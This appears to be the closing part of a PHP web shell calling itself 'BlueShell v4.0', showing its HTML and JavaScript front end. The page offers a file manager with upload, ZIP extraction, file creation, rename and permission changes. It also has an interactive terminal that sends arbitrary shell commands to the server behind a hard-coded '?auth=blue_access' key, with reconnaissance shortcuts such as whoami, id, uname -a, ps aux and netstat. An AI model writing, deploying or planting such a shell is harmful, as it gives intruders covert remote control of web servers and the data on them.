                    <button class="btn" onclick="clearTerminal()">Clear</button>
                    <button class="btn" onclick="stopCommand()">⏹️ Stop</button>
                </div>
                
                <div class="quick-cmds">
                    <span class="quick-cmd" onclick="setCommand('ls -la')">ls -la</span>
                    <span class="quick-cmd" onclick="setCommand('pwd')">pwd</span>
                    <span class="quick-cmd" onclick="setCommand('whoami')">whoami</span>
                    <span class="quick-cmd" onclick="setCommand('id')">id</span>
                    <span class="quick-cmd" onclick="setCommand('php -v')">php -v</span>
                    <span class="quick-cmd" onclick="setCommand('uname -a')">uname -a</span>
                    <span class="quick-cmd" onclick="setCommand('df -h')">df -h</span>
                    <span class="quick-cmd" onclick="setCommand('free -m')">free -m</span>
                    <span class="quick-cmd" onclick="setCommand('ps aux')">ps aux</span>
                    <span class="quick-cmd" onclick="setCommand('netstat -tulpn')">netstat</span>
                </div>
            </div>
        </div>

        <!-- Upload & ZIP Tab -->
        <div id="upload-tab" class="tab-content">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                <!-- Regular Upload -->
                <div style="background: var(--surface); border-radius: 16px; border: 1px solid var(--border); padding: 25px;">
                    <h3 style="color: var(--primary-light); margin-bottom: 20px;">📤 Upload File</h3>
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="upload" class="modal-input" required>
                        <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 15px;">
                            Max size: <?= ini_get('upload_max_filesize') ?>
                        </p>
                        <button type="submit" class="btn btn-primary" style="width: 100%;">Upload File</button>
                    </form>
                </div>
                
                <!-- ZIP Upload & Extract -->
                <div style="background: var(--surface); border-radius: 16px; border: 1px solid var(--border); padding: 25px;">
                    <h3 style="color: var(--primary-light); margin-bottom: 20px;">📦 Upload & Extract ZIP</h3>
                    <form method="POST" enctype="multipart/form-data">
                        <input type="file" name="zip_upload" accept=".zip,.tar,.gz" class="modal-input" required>
                        
                        <div style="margin-bottom: 15px;">
                            <label style="color: var(--text-secondary); font-size: 12px; display: block; margin-bottom: 5px;">
                                Extract to (optional):
                            </label>
                            <input type="text" name="extract_path" class="modal-input" style="margin-bottom: 10px;" placeholder="subfolder/ or leave empty">
                        </div>
                        
                        <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 15px;">
                            ZIP will be automatically extracted after upload
                        </p>
                        
                        <button type="submit" class="btn btn-success" style="width: 100%;">Upload & Extract ZIP</button>
                    </form>
                </div>
                
                <!-- System Info -->
                <div style="background: var(--surface); border-radius: 16px; border: 1px solid var(--border); padding: 25px;">
                    <h3 style="color: var(--primary-light); margin-bottom: 20px;">ℹ️ System Info</h3>
                    
                    <div style="margin-bottom: 15px;">
                        <div style="color: var(--text-secondary); font-size: 11px;">PHP Version</div>
                        <div style="font-family: monospace;"><?= phpversion() ?></div>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <div style="color: var(--text-secondary); font-size: 11px;">ZIP Support</div>
                        <div style="font-family: monospace; color: <?= class_exists('ZipArchive') ? 'var(--success)' : 'var(--error)' ?>">
                            <?= class_exists('ZipArchive') ? '✅ Available' : '❌ Not Available' ?>
                        </div>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <div style="color: var(--text-secondary); font-size: 11px;">Upload Max Size</div>
                        <div style="font-family: monospace;"><?= ini_get('upload_max_filesize') ?></div>
                    </div>
                    
                    <div>
                        <div style="color: var(--text-secondary); font-size: 11px;">Post Max Size</div>
                        <div style="font-family: monospace;"><?= ini_get('post_max_size') ?></div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <!-- Modals -->
    <div class="modal" id="uploadModal">
        <div class="modal-content">
            <div class="modal-title">📤 Upload File</div>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upload" class="modal-input" required>
                <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 15px;">
                    Max size: <?= ini_get('upload_max_filesize') ?>
                </p>
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('upload')">Cancel</button>
                    <button type="submit" class="btn btn-primary">Upload</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="zipModal">
        <div class="modal-content">
            <div class="modal-title">📦 Upload & Extract ZIP</div>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="zip_upload" accept=".zip,.tar,.gz" class="modal-input" required>
                
                <div style="margin-bottom: 15px;">
                    <label style="color: var(--text-secondary); font-size: 12px; display: block; margin-bottom: 5px;">
                        Extract to folder (optional):
                    </label>
                    <input type="text" name="extract_path" class="modal-input" style="margin-bottom: 10px;" placeholder="subfolder/">
                </div>
                
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('zip')">Cancel</button>
                    <button type="submit" class="btn btn-success">Upload & Extract</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="folderModal">
        <div class="modal-content">
            <div class="modal-title">📁 New Folder</div>
            <form method="POST">
                <input type="text" name="new_folder" class="modal-input" placeholder="Folder name" required>
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('folder')">Cancel</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="fileModal">
        <div class="modal-content">
            <div class="modal-title">📄 New File</div>
            <form method="POST">
                <input type="text" name="new_file" class="modal-input" placeholder="Filename" required>
                <textarea name="content" class="modal-textarea" placeholder="File content... (optional)"></textarea>
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('file')">Cancel</button>
                    <button type="submit" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="renameModal">
        <div class="modal-content">
            <div class="modal-title">📝 Rename</div>
            <form method="POST">
                <input type="hidden" name="old_name" id="oldName">
                <input type="text" name="new_name" class="modal-input" id="newName" placeholder="New name" required>
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('rename')">Cancel</button>
                    <button type="submit" name="rename" class="btn btn-primary">Rename</button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal" id="chmodModal">
        <div class="modal-content">
            <div class="modal-title">🔐 Change Permissions</div>
            <form method="POST">
                <input type="hidden" name="chmod_file" id="chmodFile">
                <input type="text" name="permissions" class="modal-input" id="chmodPerms" placeholder="755" pattern="[0-7]{3,4}" required>
                <p style="color: var(--text-secondary); font-size: 12px; margin-bottom: 15px;">
                    Octal permissions (e.g., 755, 644, 777)
                </p>
                <div class="modal-buttons">
                    <button type="button" class="btn" onclick="hideModal('chmod')">Cancel</button>
                    <button type="submit" name="chmod" class="btn btn-primary">Apply</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        let currentPath = <?= json_encode($current_path) ?>;
        let searchTimeout;
        let currentAjaxRequest = null;

        // Tab switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
            document.getElementById(tabName + '-tab').classList.add('active');
            
            if (tabName === 'terminal') {
                document.getElementById('cmdInput').focus();
            }
        }

        // Modal functions
        function showModal(type) {
            document.getElementById(type + 'Modal').style.display = 'flex';
        }

        function hideModal(type) {
            document.getElementById(type + 'Modal').style.display = 'none';
        }

        function renameItem(oldName) {
            document.getElementById('oldName').value = oldName;
            document.getElementById('newName').value = oldName;
            document.getElementById('renameModal').style.display = 'flex';
        }

        function chmodItem(file, perms) {
            document.getElementById('chmodFile').value = file;
            document.getElementById('chmodPerms').value = perms;
            document.getElementById('chmodModal').style.display = 'flex';
        }

        // Search
        function searchFiles(query) {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const filter = query.toLowerCase();
                const rows = document.querySelectorAll('#fileTable tbody tr');
                
                rows.forEach(row => {
                    const text = row.textContent.toLowerCase();
                    row.style.display = text.includes(filter) ? '' : 'none';
                });
            }, 300);
        }

        // Terminal functions - IMPROVED
        function runCommand() {
            const input = document.getElementById('cmdInput');
            const cmd = input.value.trim();
            
            if (!cmd) return;
            
            const output = document.getElementById('terminalOutput');
            output.innerHTML += '<pre>$ ' + escapeHtml(cmd) + '</pre>';
            
            // Show loading
            const loadingDiv = document.createElement('pre');
            loadingDiv.innerHTML = '<span style="color: #ff9800;">⏳ Executing...</span>';
            output.appendChild(loadingDiv);
            
            // Scroll to bottom
            output.scrollTop = output.scrollHeight;
            
            // Abort previous request if exists
            if (currentAjaxRequest) {
                currentAjaxRequest.abort();
            }
            
            // Create new request
            currentAjaxRequest = new XMLHttpRequest();
            currentAjaxRequest.open('POST', '?auth=blue_access', true);
            currentAjaxRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            
            currentAjaxRequest.onload = function() {
                loadingDiv.remove();
                
                if (currentAjaxRequest.status === 200) {
                    try {
                        const data = JSON.parse(currentAjaxRequest.responseText);
                        currentPath = data.cwd || currentPath;
                        document.getElementById('currentCwd').textContent = currentPath;
                        
                        const outputPre = document.createElement('pre');
                        
                        if (data.output && data.output.trim()) {
                            outputPre.innerHTML = escapeHtml(data.output);
                        } else {
                            outputPre.innerHTML = '<span style="color: #ff9800;">(no output)</span>';
                        }
                        
                        output.appendChild(outputPre);
                    } catch (e) {
                        const errorPre = document.createElement('pre');
                        errorPre.innerHTML = '<span style="color: #f44336;">Error parsing response</span>';
                        output.appendChild(errorPre);
                    }
                } else {
                    const errorPre = document.createElement('pre');
                    errorPre.innerHTML = '<span style="color: #f44336;">Request failed: ' + currentAjaxRequest.status + '</span>';
                    output.appendChild(errorPre);
                }
                
                output.scrollTop = output.scrollHeight;
                currentAjaxRequest = null;
            };
            
            currentAjaxRequest.onerror = function() {
                loadingDiv.remove();
                const errorPre = document.createElement('pre');
                errorPre.innerHTML = '<span style="color: #f44336;">Network error</span>';
                output.appendChild(errorPre);
                output.scrollTop = output.scrollHeight;
                currentAjaxRequest = null;
            };
            
            currentAjaxRequest.send('ajax=cmd&cmd=' + encodeURIComponent(cmd) + '&cwd=' + encodeURIComponent(currentPath));
            
            input.value = '';
        }

        function stopCommand() {
            if (currentAjaxRequest) {
                currentAjaxRequest.abort();
                currentAjaxRequest = null;
                
                const output = document.getElementById('terminalOutput');
                const stopPre = document.createElement('pre');
                stopPre.innerHTML = '<span style="color: #ff9800;">⏹️ Command stopped</span>';
                output.appendChild(stopPre);
                output.scrollTop = output.scrollHeight;
            }
        }

        function setCommand(cmd) {
            document.getElementById('cmdInput').value = cmd;
            runCommand();
        }

        function clearTerminal() {
            const output = document.getElementById('terminalOutput');
            output.innerHTML = '<pre>BlueShell v4.0 - Interactive Terminal Ready\nType \'help\' for available commands or click quick commands below.</pre>';
            document.getElementById('cmdInput').value = '';
            document.getElementById('cmdInput').focus();
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Escape to close modals
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
            }
            
            // Ctrl+L to clear terminal (only in terminal tab)
            if (e.ctrlKey && e.key === 'l') {
                e.preventDefault();
                if (document.getElementById('terminal-tab').classList.contains('active')) {
                    clearTerminal();
                }
            }
            
            // Ctrl+F to focus search
            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                document.getElementById('searchInput')?.focus();
            }
            
            // Alt+1, Alt+2, Alt+3 for tab switching
            if (e.altKey && e.key === '1') {
                e.preventDefault();
                switchTab('files');
            }
            if (e.altKey && e.key === '2') {
                e.preventDefault();
                switchTab('terminal');
            }
            if (e.altKey && e.key === '3') {
                e.preventDefault();
                switchTab('upload');
            }
        });

        // Enter key in terminal
        document.getElementById('cmdInput')?.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                runCommand();
            }
        });

        // Close modals when clicking outside
        window.onclick = function(e) {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        };

        // Auto-hide messages after 5 seconds
        setTimeout(() => {
            document.querySelectorAll('.message').forEach(msg => {
                msg.style.opacity = '0';
                msg.style.transition = 'opacity 0.5s';
                setTimeout(() => msg.remove(), 500);
            });
        }, 5000);
    </script>
</body>
</html>
